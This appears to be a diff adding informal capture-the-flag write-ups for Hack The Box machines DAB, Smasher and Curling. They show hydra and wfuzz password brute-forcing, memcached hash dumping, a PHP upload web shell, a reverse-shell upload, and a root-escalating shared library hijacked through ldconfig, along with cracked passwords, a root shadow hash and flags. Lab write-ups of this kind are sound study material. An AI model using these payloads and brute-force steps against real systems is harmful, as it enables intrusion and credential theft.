@@ -1,3 +1,225 @@
+HTB DAB
+1)Nmap show us 4 port
+21 tcp ftp
+22 tcp openssh
+80 tcp web
+8080 tcp web
+2)running dirb doest show us anything no pass user or nothig
+3)on port 80 we found a login form and on port 8080 we see a message wrong password cookie
+now lets try to bruteforce with hydra
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.86 http-post-form "/login:username=admin&password=^PASS^&submit=Login:Error" -t 64
+default most simple user : admin we found its password : Password1
+4)Now we can start making our way in
+5)Capturing the login request with burp we see theres a cookie for our session so i assume i have to use this cookie on the other port.
+6)We capture the request for port 8080
+7)Then we see if we change the cookie we got from admin on port 80 to port 8080 its give us a different response invalid password for cookie so we can appen the value ;password=mypassword; at the end.
+ 
+GET / HTTP/1.1
+Host: 10.10.10.86:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: session=eyJ1c2VybmFtZSI6ImFkbWluIn0.DrtWBg.AIM2lbINPVlYH3oiuZo8SnvajSM;password=not;
+Connection: close
+Upgrade-Insecure-Requests: 1
+ 
+8)After using burp intruder to try to crack the password and so many attemps i decided to give it a go to wfuzz
+we use it like this:
+wfuzz -c -z file,/usr/share/wordlists/rockyou.txt --hh 324 -u http://10.10.10.86:8080 -b password=FUZZ -t 50
+ 
+and we bruteforce the password getting :    secret
+now we can modify the burp request and set to the correct password
+GET / HTTP/1.1
+Host: 10.10.10.86:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: session=eyJ1c2VybmFtZSI6ImFkbWluIn0.DrtWBg.AIM2lbINPVlYH3oiuZo8SnvajSM;password=secret;
+Connection: close
+Upgrade-Insecure-Requests: 1
+ 
+9)now showing response in browser we are in page that ask us for a tcp port and a line to execute:
+ 
+URL = http://10.10.10.86:8080/socket?port=6666&cmd=nc%2010.10.15.110
+ 
+when we execute any command we see 500 internal server errro and/or hacking attemp:
+so its running memcached.
+ 
+The fact that a cache engine is being mentioned is a huge hint. A quick google will eventually
+lead us to the memcached software which is a key-based cache that stores data and objects
+wherever spare RAM is available for quick access by applications, without going through layers
+of parsing or disk I/O. According to MySQL and memcached guide, by default, memcached uses
+the following settings:
+ 
+• Memory allocation of 64MB
+• Listens for connections on all network interfaces, using port 11211
+• Supports a maximum of 1024 simultaneous connections
+ 
+Reading a ton about memcached i found this interesting info:
+https://ma.ttias.be/read-keys-values-memcached-instance/
+10)so i run in the memcached server the following commands:
+first:
+stats slabs #to see how many slabs of data there were
+second:
+stats cachedump 26 1000 #26 its the number of the slab where the data its stored there were other slabs but they not contian any data at all.
+this shows us theres a key named users so
+third:
+get key users
+11)this shows us a dic with all the users and their md5 hashes 496 users.
+so we can try and use everyone of them in ssh or we can make a ssh enum with metasploit so fire up and set :
+use auxiliary/scanner/ssh/ssh_enumusers
+set your ports and a txt file containing all the users
+for the dic as its constructed as dic the user its the key value so i made a script to print me just the key values and then stored into a txt file to give to metasploit.
+Run you scanner and the user actually found its:
+cracked with crackstation
+genevieve with hash fc7992e8952a8ff5000cb7856d8586d2:Princess1
+ 
+Use on ssh and we are in!! let get the user flag
+ 
+12)Now into priv Escalation.
+Looking for all steps for priv esc i found a binary called try_harder but its a rabbit hole now searching i found another binary called myexec it ask for password.
+I downloaded to my machine with python simplehttpserver
+now when i try to run it it ask for a library libseclogin as it not installed by default i google it to try an install it and its actually a code from a guest user on pastebin and in the end of writeup theres the password for the same binary
+/usr/bin/myexec actually the password its s3cur3l0g1n.
+Now for the correct way to do it we will diasembly with radare2
+RUN radare2 myexec
+.enter aaa to analize the whole program
+.enter s main to go to the main function
+.now pdf to see the funtion diasembly
+.if you enter VV you enter diagram mode.
+ 
+Now looking for the code wee see theres some lines of text s3curel0 and in a separated variable another string g1n
+which its the password.
+Now running the binary give us this:
+ 
+Password is correct
+ 
+seclogin() called
+ 
+TODO: Placeholder for now, function not implemented yet
+ 
+This is the part which I spent a good amount of time looking into this binary file. One of the
+commands (besides the typical ones such as getfacl, getcap, etc.) is objdump which displays
+information from object files. Let's display the contents of all headers using the -x option for the
+myexec program:
+ 
+$ objdump -x /usr/bin/myexec
+ 
+...
+ 
+Dynamic Section:
+ 
+ NEEDED libseclogin.so
+ 
+ NEEDED libc.so.6
+ 
+...
+ 
+As the output indicates, the myexec binary depends on two dynamic libraries (.so shared objects
+files). This means that the program references these libraries at runtime (similarly to Window's
+.dll). We can see this by running ldd which prints shared object dependencies:
+ 
+$ ldd /usr/bin/myexec
+ 
+ linux-vdso.so.1 => (0x00007ffe00c69000)
+ 
+ libseclogin.so => /usr/lib/libseclogin.so (0x00007f880282f000)
+ 
+ libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f8802465000)
+ 
+ /lib64/ld-linux-x86-64.so.2 (0x00007f8802a31000)
+ 
+Let's focus in libseclogin.so library since libc is the C standard library. The libseclogin shared
+object is owned by root and we have no write permissions in the /usr/lib/ directory from where
+the library is referenced.
+ 
+$ ls -la /usr/lib/libseclogin.so
+ 
+-rwxr-xr-x 1 root root 8120 Mar 25 23:46 /usr/lib/libseclogin.so
+ 
+The vector of attack here would be similar to python library hijacking, and we could actually
+configure dynamic linker run-time bindings using the ldconfig command. Normally, we would
+need root privileges to do such operations, unless the sticky bit is set for ldconfig (which is
+unusual, but in this case it is configured so as we mentioned it earlier). This is where privilege
+escalation takes place, as we can manually link libraries using the -l option of ldconfig.
+now at end of the function it look it calls libseclogin() but its not finished yet so we can create our custom script to call it from our own library like this:
+ 
+#include <unistd.h>
+#include <stdlib.h>
+#include <stdio.h>
+#include <sys/types.h>
+void seclogin()
+{
+        setuid(0);
+        setgid(0);
+        execl("/bin/bash","sh",(char *)0);
+}
+int main(void)
+{
+        seclogin();
+}
+ 
+Compile the code with
+gcc -shared -o libseclogin.so -fPIC libseclogin.c
+ 
+Now
+ldconfig -l /dev/shm/libseclogin.so
+ 
+Since dynamic linker uses the LD_LIBRARY_PATH variable, we need to set that up too:
+ 
+$ LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/dev/shm
+ 
+run ldconfig to change variable path.
+execute myexec and get root flag:
+45cd53a83bf364456386816e35e6a98e
+ 
+HTB SMASHER
+1)Nmap throws us some results open ports:
+6969 tcp acmsoda
+1111 tcp lmsocialserver
+22 tcp openssh
+2)Running dirb doesnt show us anything
+3)Navigating through the ports no one seems to respond but for a second i got a response from port 1111 on web
+it seems theres a service that restarts every 60 seconds that why i was no having responses at all
+4)Again runing dirb doesnt shows anything
+5)In 1111 webpage we see theres something like dir we select index.html and see a login page perhaps we can navigate further if we scape another "/" so we go to http://10.10.10.89:1111// and we see all the dirs listed online.
+ 
+HTB CURLING
+1)Enumeration with nmap show us 2 open port 80,22
+2)Acces with browser its a joomla webpage with some info
+3)researching the source code we found a directory to upload and file called secret.txt with a base64 encoded password which is: Curling2018!
+Now reading on the webpage we see Super User posts but one of them its signed by a user named floris so we try to login with floris:Curling2018 and it worked.
+Now searching through dirs we found /administrator page for joomla login:
+and the same credentials worked well.
+now we must find a way to upload something.
+logged to joomla we found and interesting module to upload now just set it up and allow some file type like php to get your reverse shell
+***********************
+<?php echo '<b><br><br>'.php_uname().'<br></b>'; echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">'; echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>'; if( $_POST['_upl'] == "Upload" ) { if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>toborbitch</b><br><br>'; } else { echo '<b>Upload Sucess !!!</b><br><br>'; } } ?>
+***********************
+4)Then we search a directory to upload files
+http://10.10.10.150/index.php/component/users/?view=remind&Itemid=101
+and accept php files so we try to upload a php-reverse shell and it worked
+now we are inside www-data user we see a pass backup
+now we see its a hexdump file so the method to decrypt this types of files its:
+xxd -r password_backup
+then the result file we have to see what type its so we use:
+file password_backup
+then change file extension to the type of file it its and decompress
+then again check file, change extension, decompress until you get something readable
+5)Now we got the password: for floris user which is : 5d<wdCbdZu)|hChXll
+6)login in through ssh and get the user flag.
+7)Now for privilege scalation
+8)We see a folder called admin-area its seems suspicious so we go to dir and we found to files one called input which parses all 127.0.0.1 data to the other file named report. and its running as root! so we can take advantage on this:
+On the input file we can overwrite its contents and put:
+url = "file:///root/root.txt"
+before it was url= "http://127.0.0.1/""
+and automatic you will get you key
+from etc/shadow  root hash>>>>  $6$RIgrVboA$HDaB29xvtkw6U/Mzq4qOHH2KHB1kIR0ezFyjL75DszasVFwznrsWcc1Tu5E2K4FA7/Nv8oje0c.bljjnn6FMF1
+ 
+and we got the root flag: 82c198ab6fc5365fdc6da2ee5c26064a
+ 
 HTB REDISH
 1)As usual we run our nmap scan and show us just tcp port 1880
 2)we navigate to it in browser and just got a /get response
